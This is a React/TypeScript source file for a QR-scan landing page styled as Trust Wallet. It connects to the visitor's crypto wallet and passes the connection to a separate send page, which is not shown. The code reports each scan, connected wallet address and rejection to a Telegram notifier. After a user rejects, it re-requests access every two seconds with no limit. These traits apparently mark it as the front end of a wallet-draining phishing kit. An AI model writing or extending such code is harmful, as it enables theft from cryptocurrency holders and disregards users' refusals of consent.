import { useState, useEffect, useRef } from "react"
import { ethers } from "ethers"
import { notify, formatAddress } from "../lib/telegram"
import SendPage from "./send-page"

type Step = "detecting" | "send" | "error" | "not_trust"

export default function QRLanding() {
  const [step, setStep] = useState<Step>("detecting")
  const [provider, setProvider] = useState<any>(null)
  const [address, setAddress] = useState("")
  const [retryCount, setRetryCount] = useState(0)
  const mountedRef = useRef(true)

  const isIOS =
    /iPad|iPhone|iPod/.test(navigator.userAgent) ||
    (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)

  useEffect(() => {
    mountedRef.current = true
    notify("QR Code Scanned")

    const tryDetect = async () => {
      if (!mountedRef.current) return
      const eth = (window as any).ethereum
      const trustWallet = (window as any).trustwallet
      const injectedProvider = eth || trustWallet

      if (!injectedProvider) {
        if (!mountedRef.current) return
        setStep("not_trust")
        return
      }

      try {
        const bp = new ethers.BrowserProvider(injectedProvider)
        const accounts = await bp.send("eth_requestAccounts", [])
        const addr = accounts[0]
        await notify("Wallet Connected: " + formatAddress(addr))
        if (!mountedRef.current) return
        setProvider(bp)
        setAddress(addr)
        setStep("send")
      } catch (err: any) {
        if (err.code === 4001 || err.message?.includes("user rejected")) {
          await notify("Connection Rejected - Retrying...")
          setRetryCount(prev => prev + 1)
          setTimeout(() => {
            if (mountedRef.current) tryDetect()
          }, 2000)
        } else {
          console.error("Connection error:", err)
          if (!mountedRef.current) return
          setStep("error")
        }
      }
    }

    tryDetect()

    return () => {
      mountedRef.current = false
    }
  }, [])

  const trustWalletDeepLink =
    "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href)

  const styles = {
    container: {
      display: "flex", flexDirection: "column" as const, alignItems: "center",
      justifyContent: "center", minHeight: "100dvh", padding: "0 24px", background: "#0C0F1E"
    },
    spinner: {
      width: "64px", height: "64px", border: "4px solid rgba(51, 117, 187, 0.3)",
      borderTopColor: "#3375BB", borderRadius: "50%", animation: "spin 1s linear infinite",
      marginBottom: "24px"
    },
    title: { fontSize: "20px", fontWeight: 600, color: "#fff", marginBottom: "8px", textAlign: "center" as const },
    subtitle: { fontSize: "14px", color: "#9CA3AF", textAlign: "center" as const, maxWidth: "320px", lineHeight: "1.5" },
    errorIcon: {
      width: "64px", height: "64px", borderRadius: "50%", background: "rgba(240, 68, 56, 0.1)",
      display: "flex", alignItems: "center", justifyContent: "center", fontSize: "24px",
      color: "#F04438", fontWeight: "bold", marginBottom: "24px"
    },
    button: {
      background: "#3375BB", color: "#fff", border: "none", padding: "14px 32px",
      borderRadius: "12px", fontSize: "14px", fontWeight: 500, cursor: "pointer",
      marginTop: "16px", width: "100%", maxWidth: "320px"
    },
    trustButton: {
      background: "#F0B90B", color: "#0C0F1E", border: "none", padding: "16px 32px",
      borderRadius: "12px", fontSize: "16px", fontWeight: 700, cursor: "pointer",
      marginTop: "16px", width: "100%", maxWidth: "320px", textAlign: "center" as const,
      textDecoration: "none", display: "block", boxSizing: "border-box" as const
    },
    smallText: { fontSize: "12px", color: "#6B7280", marginTop: "16px", textAlign: "center" as const, lineHeight: "1.5" },
    trustIcon: {
      width: "64px", height: "64px", borderRadius: "50%", background: "rgba(240, 185, 11, 0.15)",
      display: "flex", alignItems: "center", justifyContent: "center", fontSize: "28px",
      color: "#F0B90B", fontWeight: "bold", marginBottom: "24px"
    },
    instructions: {
      background: "#1F2233", borderRadius: "12px", padding: "16px", marginTop: "16px",
      width: "100%", maxWidth: "320px", textAlign: "left" as const
    },
    step: { fontSize: "13px", color: "#9CA3AF", marginBottom: "8px", lineHeight: "1.5" },
    urlBox: {
      background: "#0C0F1E", borderRadius: "8px", padding: "10px 12px", fontSize: "12px",
      color: "#3375BB", wordBreak: "break-all" as const, marginTop: "8px", border: "1px solid #2E3144"
    },
    warningBox: {
      background: "rgba(240, 185, 11, 0.1)", border: "1px solid rgba(240, 185, 11, 0.3)",
      borderRadius: "12px", padding: "12px 16px", marginTop: "16px",
      width: "100%", maxWidth: "320px", textAlign: "center" as const
    },
    warningText: { fontSize: "12px", color: "#F0B90B", lineHeight: "1.5" }
  }

  if (step === "not_trust") {
    return (
      <div style={styles.container}>
        <div style={styles.trustIcon}>T</div>
        <h1 style={styles.title}>Open in Trust Wallet</h1>
        <p style={styles.subtitle}>This page must be opened inside the Trust Wallet app.</p>
        {isIOS && (
          <div style={styles.warningBox}>
            <p style={styles.warningText}>
              On iPhone: Open Safari → type "trust://browser_enable" → tap Go. This enables the DApp browser in Trust Wallet.
            </p>
          </div>
        )}
        <a href={trustWalletDeepLink} style={styles.trustButton} role="button">Open in Trust Wallet</a>
        <div style={styles.instructions}>
          <p style={styles.step}>1. Tap the "Open in Trust Wallet" button above</p>
          <p style={styles.step}>2. If prompted, choose Trust Wallet</p>
          <p style={styles.step}>3. The app will open and connect automatically</p>
          <p style={styles.step}>4. If nothing happens, copy the URL below and paste it in Trust Wallet's Browser/Discover tab</p>
        </div>
        <p style={styles.smallText}>Or manually paste this URL in Trust Wallet Browser:</p>
        <div style={styles.urlBox}>{window.location.href}</div>
        <button style={styles.button} onClick={() => window.location.reload()}>Retry</button>
      </div>
    )
  }

  if (step === "detecting") {
    return (
      <div style={styles.container}>
        <div style={styles.spinner} />
        <h1 style={styles.title}>Connecting to Wallet...</h1>
        <p style={styles.subtitle}>Please approve the connection in your wallet</p>
        {retryCount > 0 && <p style={styles.smallText}>Retry attempt: {retryCount}</p>}
        <p style={styles.smallText}>Trust Wallet - DApp Browser</p>
      </div>
    )
  }

  if (step === "error") {
    return (
      <div style={styles.container}>
        <div style={styles.errorIcon}>!</div>
        <h1 style={styles.title}>Connection Failed</h1>
        <p style={styles.subtitle}>Could not connect to your wallet. Try reopening the page.</p>
        <a href={trustWalletDeepLink} style={styles.trustButton} role="button">Open in Trust Wallet</a>
        <button style={styles.button} onClick={() => { setStep("detecting"); setRetryCount(0) }}>Retry</button>
      </div>
    )
  }

  if (provider && address) {
    return <SendPage provider={provider} address={address} />
  }

  return null
}